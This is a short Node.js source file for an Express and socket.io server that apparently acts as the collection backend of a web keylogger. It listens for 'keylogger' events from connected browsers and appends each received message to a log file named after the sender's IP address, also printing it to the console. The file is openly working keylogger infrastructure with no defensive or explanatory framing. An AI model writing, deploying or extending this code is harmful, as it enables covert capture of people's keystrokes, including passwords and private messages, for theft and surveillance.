const express = require('express')
const app = express()
const http = require('http').Server(app)
const io = require('socket.io')(http)
const path = require('path')
const fs = require('fs')

fs.mkdir(path.join(__dirname,'log'), function(err) {
  if (err) console.log(err);
})

app.use(express.static('public'));

io.on('connection', function(socket) {
  console.log('a user connected')

  socket.on('disconnect', function() {
    console.log('user disconnected');
  })

  socket.on('keylogger', function(msg){
    var address = socket.handshake.address;
    fs.appendFile(path.join('log', address + '.txt'), msg, function (err) {
      if (err) throw err;
      process.stdout.write(msg);
    })
  })

})

http.listen(3000, function() {
  console.log((new Date()) + ' Server is listening on port 3000')
})
